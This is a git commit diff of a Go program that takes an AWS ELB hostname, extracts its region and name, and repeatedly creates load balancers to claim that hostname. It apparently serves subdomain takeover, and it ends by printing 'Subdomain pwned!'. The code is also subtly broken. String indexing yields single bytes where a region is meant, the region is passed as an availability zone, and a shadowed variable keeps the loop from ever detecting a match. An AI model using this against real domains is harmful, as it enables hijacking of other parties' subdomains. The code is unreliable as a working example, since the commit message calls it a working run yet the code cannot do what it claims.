c159708e0d31e9a22cb507608c909dfe76185d6b
Rick Rackow <rrackow@redhat.com>
2020-08-28 15:53:09 +0200

    main: update with working run

--- main.go
+++ main.go
@@ -3,9 +3,10 @@ package main
 import (
 	"flag"
 	"fmt"
-	"github.com/aws/aws-sdk-go"
+	"github.com/aws/aws-sdk-go/aws"
+	"github.com/aws/aws-sdk-go/aws/awserr"
 	"github.com/aws/aws-sdk-go/aws/session"
-	"github.com/aws/aws-sdk-go/service/ec2"
+	"github.com/aws/aws-sdk-go/service/elb"
 	"log"
 	"regexp"
 )
@@ -25,7 +26,9 @@ func main() {
 	*/
 	reNum := regexp.MustCompile(`-(\d{6,10})\.`)
 	// Get the "random" number from the elb
-	NumToFind := reNum.FindStringSubmatch(*elbPtr)
+	NumToFind := string(reNum.FindStringSubmatch(*elbPtr)[0])
+
+	fmt.Println(NumToFind)
 
 	/* All AWS Regions we're matching
 	us-east-2
@@ -50,8 +53,91 @@ func main() {
 	us-gov-east-1
 	*/
 	// Define the regex to match the region
-	reReg := regexp.MustCompile(`(us(-gov)?|ap|ca|cn|eu|sa)-(central|(north|south)?(east|west)?)-\d`)
+	reRegion := regexp.MustCompile(`(us(-gov)?|ap|ca|cn|eu|sa)-(central|(north|south)?(east|west)?)-\d`)
 	// Get the region of the ELB
-	elbReg := reReg.FindString(*elbPtr)
+	elbRegion := string(reRegion.FindString(*elbPtr)[0])
+
+	// Get the "name" of the ELB that we'll be using to create new ELBs
+	// Define the regex
+	reName := regexp.MustCompile(`^(.*)-\d{6,10}\.`)
+	// Get the name
+	elbName := string(reName.FindStringSubmatch(*elbPtr)[0])
+
+	// Now that we have what we're looking for, let's start to create ELBs
+
+	// Initialise AWS session including the region we extracted from the ELB
+	sess, err := session.NewSession(&aws.Config{
+		Region: aws.String(elbRegion)},
+	)
+	if err != nil {
+		log.Fatal("Could not initiate session")
+	}
+
+	// Create ELB service client
+	svc := elb.New(sess)
+
+	// initialise empty var so we can loop
+	result := ""
+	for result != *elbPtr {
+		fmt.Println("Creating ELB")
+		input := &elb.CreateLoadBalancerInput{
+			AvailabilityZones: []*string{
+				aws.String(elbRegion),
+			},
+			Listeners: []*elb.Listener{
+				{
+					InstancePort:     aws.Int64(80),
+					InstanceProtocol: aws.String("HTTP"),
+					LoadBalancerPort: aws.Int64(80),
+					Protocol:         aws.String("HTTP"),
+				},
+			},
+			LoadBalancerName: aws.String(elbName),
+		}
+
+		result, err := svc.CreateLoadBalancer(input)
+		if err != nil {
+			if aerr, ok := err.(awserr.Error); ok {
+				switch aerr.Code() {
+				case elb.ErrCodeDuplicateAccessPointNameException:
+					fmt.Println(elb.ErrCodeDuplicateAccessPointNameException, aerr.Error())
+				case elb.ErrCodeTooManyAccessPointsException:
+					fmt.Println(elb.ErrCodeTooManyAccessPointsException, aerr.Error())
+				case elb.ErrCodeCertificateNotFoundException:
+					fmt.Println(elb.ErrCodeCertificateNotFoundException, aerr.Error())
+				case elb.ErrCodeInvalidConfigurationRequestException:
+					fmt.Println(elb.ErrCodeInvalidConfigurationRequestException, aerr.Error())
+				case elb.ErrCodeSubnetNotFoundException:
+					fmt.Println(elb.ErrCodeSubnetNotFoundException, aerr.Error())
+				case elb.ErrCodeInvalidSubnetException:
+					fmt.Println(elb.ErrCodeInvalidSubnetException, aerr.Error())
+				case elb.ErrCodeInvalidSecurityGroupException:
+					fmt.Println(elb.ErrCodeInvalidSecurityGroupException, aerr.Error())
+				case elb.ErrCodeInvalidSchemeException:
+					fmt.Println(elb.ErrCodeInvalidSchemeException, aerr.Error())
+				case elb.ErrCodeTooManyTagsException:
+					fmt.Println(elb.ErrCodeTooManyTagsException, aerr.Error())
+				case elb.ErrCodeDuplicateTagKeysException:
+					fmt.Println(elb.ErrCodeDuplicateTagKeysException, aerr.Error())
+				case elb.ErrCodeUnsupportedProtocolException:
+					fmt.Println(elb.ErrCodeUnsupportedProtocolException, aerr.Error())
+				case elb.ErrCodeOperationNotPermittedException:
+					fmt.Println(elb.ErrCodeOperationNotPermittedException, aerr.Error())
+				default:
+					fmt.Println(aerr.Error())
+				}
+			} else {
+				// Print the error, cast err to awserr.Error to get the Code and
+				// Message from an error.
+				fmt.Println(err.Error())
+			}
+			return
+		}
+
+		fmt.Println(result)
+	}
+	fmt.Println("Found match!")
+	fmt.Println("ELB created!")
+	fmt.Println("Subdomain pwned!")
 
 }
